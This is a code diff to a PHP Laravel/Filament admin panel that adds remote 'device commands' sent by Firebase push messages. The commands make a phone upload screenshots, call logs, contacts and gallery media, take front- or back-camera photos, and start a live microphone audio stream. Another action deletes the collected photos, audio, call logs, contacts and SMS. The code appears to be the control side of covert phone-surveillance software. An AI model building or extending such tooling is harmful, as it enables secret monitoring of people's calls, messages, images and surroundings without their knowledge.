@@ -104,8 +104,8 @@ class UserResource extends Resource
                 //
             ])
             ->actions([
-                Tables\Actions\EditAction::make(),
                 Tables\Actions\ActionGroup::make([
+                    Tables\Actions\EditAction::make(),
                     Tables\Actions\Action::make('request_screenshot')
                         ->label('Request Screenshot')
                         ->icon('heroicon-o-camera')
@@ -113,58 +113,109 @@ class UserResource extends Resource
                             if (!$record->fcm_token) {
                                 \Filament\Notifications\Notification::make()
                                     ->title('No FCM Token')
-                                    ->body('This device does not have an FCM token.')
                                     ->danger()
                                     ->send();
                                 return;
                             }
-    
                             try {
-                                // Path to credentials
                                 $credentialsPath = storage_path('app/firebase_credentials.json');
-                                if (!file_exists($credentialsPath)) {
-                                    throw new \Exception('Firebase credentials not found at ' . $credentialsPath);
-                                }
-    
+                                if (!file_exists($credentialsPath)) throw new \Exception('Firebase credentials not found');
                                 $jsonKey = json_decode(file_get_contents($credentialsPath), true);
-                                $projectId = $jsonKey['project_id'];
-    
-                                // Get Access Token
                                 $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
-                                    'https://www.googleapis.com/auth/firebase.messaging',
-                                    $credentialsPath
+                                    'https://www.googleapis.com/auth/firebase.messaging', $credentialsPath
                                 );
                                 $token = $credentials->fetchAuthToken();
-    
-                                // Send FCM
                                 $client = new \GuzzleHttp\Client();
-                                $response = $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
-                                    'headers' => [
-                                        'Authorization' => 'Bearer ' . $token['access_token'],
-                                        'Content-Type' => 'application/json',
-                                    ],
-                                    'json' => [
-                                        'message' => [
-                                            'token' => $record->fcm_token,
-                                            'data' => [
-                                                'action' => 'screenshot',
-                                            ],
-                                        ],
-                                    ],
+                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
+                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'screenshot']]],
                                 ]);
-    
-                                \Filament\Notifications\Notification::make()
-                                    ->title('Screenshot Requested')
-                                    ->success()
-                                    ->send();
-    
+                                \Filament\Notifications\Notification::make()->title('Screenshot Requested')->success()->send();
                             } catch (\Exception $e) {
-                                 \Filament\Notifications\Notification::make()
-                                    ->title('Failed to Request Screenshot')
-                                    ->body($e->getMessage())
-                                    ->danger()
-                                    ->send();
+                                \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send();
                             }
+                        }),
+                    Tables\Actions\Action::make('request_call_log')
+                        ->label('Request Call Log')
+                        ->icon('heroicon-o-phone')
+                        ->action(function (User $record) {
+                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
+                            try {
+                                $credentialsPath = storage_path('app/firebase_credentials.json');
+                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
+                                $token = $credentials->fetchAuthToken();
+                                $client = new \GuzzleHttp\Client();
+                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
+                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_call_log']]],
+                                ]);
+                                \Filament\Notifications\Notification::make()->title('Call Log Requested')->success()->send();
+                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
+                        }),
+                    Tables\Actions\Action::make('request_contacts')
+                        ->label('Request Contacts')
+                        ->icon('heroicon-o-users')
+                        ->action(function (User $record) {
+                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
+                            try {
+                                $credentialsPath = storage_path('app/firebase_credentials.json');
+                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
+                                $token = $credentials->fetchAuthToken();
+                                $client = new \GuzzleHttp\Client();
+                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
+                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_contacts']]],
+                                ]);
+                                \Filament\Notifications\Notification::make()->title('Contacts Requested')->success()->send();
+                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
+                        }),
+                    Tables\Actions\Action::make('start_audio_stream')
+                        ->label('Start Audio Stream')
+                        ->icon('heroicon-o-microphone')
+                        ->color('success')
+                        ->action(function (User $record) {
+                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
+                            try {
+                                $stream = \App\Models\LiveStream::create(['user_id' => $record->id, 'status' => 'active', 'started_at' => now()]);
+                                $credentialsPath = storage_path('app/firebase_credentials.json');
+                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
+                                $token = $credentials->fetchAuthToken();
+                                $client = new \GuzzleHttp\Client();
+                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
+                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'start_stream', 'live_stream_id' => (string)$stream->id]]],
+                                ]);
+                                \Filament\Notifications\Notification::make()->title('Stream Started')->success()->send();
+                                return redirect()->to(\App\Filament\Resources\LiveStreamResource::getUrl('view', ['record' => $stream->id]));
+                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
+                        }),
+                    Tables\Actions\Action::make('request_photo')
+                        ->label('Request Photo')
+                        ->icon('heroicon-o-camera')
+                        ->form([
+                            Forms\Components\Select::make('camera_facing')
+                                ->label('Camera')
+                                ->options(['back' => 'Back Camera', 'front' => 'Front Camera'])
+                                ->default('back')
+                                ->required(),
+                        ])
+                        ->action(function (User $record, array $data) {
+                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
+                            try {
+                                $credentialsPath = storage_path('app/firebase_credentials.json');
+                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
+                                $token = $credentials->fetchAuthToken();
+                                $client = new \GuzzleHttp\Client();
+                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
+                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'capture_image', 'camera_facing' => $data['camera_facing']]]],
+                                ]);
+                                \Filament\Notifications\Notification::make()->title('Photo Requested')->success()->send();
+                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                         }),
                     Tables\Actions\Action::make('request_gallery_backup')
                         ->label('Request Gallery Backup')
@@ -172,69 +223,52 @@ class UserResource extends Resource
                         ->form([
                             Forms\Components\Select::make('media_type')
                                 ->label('Media Type')
-                                ->options([
-                                    'photos' => 'Photos Only',
-                                    'videos' => 'Videos Only',
-                                    'all' => 'Both (Photos & Videos)',
-                                ])
+                                ->options(['photos' => 'Photos Only', 'videos' => 'Videos Only', 'all' => 'Both'])
                                 ->default('all')
                                 ->required(),
                         ])
                         ->action(function (User $record, array $data) {
-                            if (!$record->fcm_token) {
-                                 \Filament\Notifications\Notification::make()
-                                    ->title('No FCM Token')
-                                    ->danger()
-                                    ->send();
-                                return;
-                            }
-    
+                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                             try {
-                                 // Re-use credentials logic (Refactor later into a service)
-                                 $credentialsPath = storage_path('app/firebase_credentials.json');
-                                 $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
-                                    'https://www.googleapis.com/auth/firebase.messaging',
-                                    $credentialsPath
-                                 );
-                                 $token = $credentials->fetchAuthToken();
-                                 $jsonKey = json_decode(file_get_contents($credentialsPath), true);
-                                 $projectId = $jsonKey['project_id'];
-    
-                                 $client = new \GuzzleHttp\Client();
-                                 $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
-                                    'headers' => [
-                                        'Authorization' => 'Bearer ' . $token['access_token'],
-                                        'Content-Type' => 'application/json',
-                                    ],
-                                    'json' => [
-                                        'message' => [
-                                            'token' => $record->fcm_token,
-                                            'data' => [
-                                                'action' => 'backup_gallery',
-                                                'media_type' => $data['media_type'],
-                                            ],
-                                        ],
-                                    ],
+                                $credentialsPath = storage_path('app/firebase_credentials.json');
+                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
+                                $token = $credentials->fetchAuthToken();
+                                $client = new \GuzzleHttp\Client();
+                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
+                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
+                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_gallery', 'media_type' => $data['media_type']]]],
                                 ]);
-    
-                                \Filament\Notifications\Notification::make()
-                                    ->title('Gallery Backup Requested')
-                                    ->body("Request sent for " . $data['media_type'])
-                                    ->success()
-                                    ->send();
-    
-                            } catch (\Exception $e) {
-                                 \Filament\Notifications\Notification::make()
-                                    ->title('Request Failed')
-                                    ->body($e->getMessage())
-                                    ->danger()
-                                    ->send();
-                            }
+                                \Filament\Notifications\Notification::make()->title('Gallery Backup Requested')->success()->send();
+                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                         }),
+                    Tables\Actions\Action::make('clean_data')
+                        ->label('Clean Data')
+                        ->icon('heroicon-o-trash')
+                        ->color('danger')
+                        ->form([
+                            Forms\Components\CheckboxList::make('data_types')
+                                ->label('Select Data to Delete')
+                                ->options(['photos' => 'Photos', 'videos' => 'Videos', 'audio' => 'Audio', 'call_logs' => 'Call Logs', 'contacts' => 'Contacts', 'sms' => 'SMS'])
+                                ->required(),
+                        ])
+                        ->action(function (User $record, array $data) {
+                            $count = 0;
+                            foreach ($data['data_types'] as $type) {
+                                if (in_array($type, ['photos', 'videos', 'audio'])) {
+                                    $mime = match($type) { 'photos' => 'image/%', 'videos' => 'video/%', 'audio' => 'audio/%' };
+                                    foreach ($record->media()->where('file_type', 'like', $mime)->get() as $item) { \Illuminate\Support\Facades\Storage::disk('public')->delete($item->file_path); $item->delete(); $count++; }
+                                } else {
+                                    $map = ['call_logs' => 'call_log', 'contacts' => 'contacts', 'sms' => 'sms'];
+                                    if (isset($map[$type])) $count += $record->backups()->where('type', $map[$type])->delete();
+                                }
+                            }
+                            \Filament\Notifications\Notification::make()->title('Data Cleaned')->body("Deleted {$count} items.")->success()->send();
+                        }),
+                    Tables\Actions\DeleteAction::make(),
                 ])
-                ->label('Device Commands')
-                ->icon('heroicon-m-ellipsis-horizontal')
-                ->tooltip('Manage Device'),
+                ->icon('heroicon-m-ellipsis-vertical')
+                ->tooltip('Actions'),
             ])
             ->bulkActions([
                 Tables\Actions\BulkActionGroup::make([
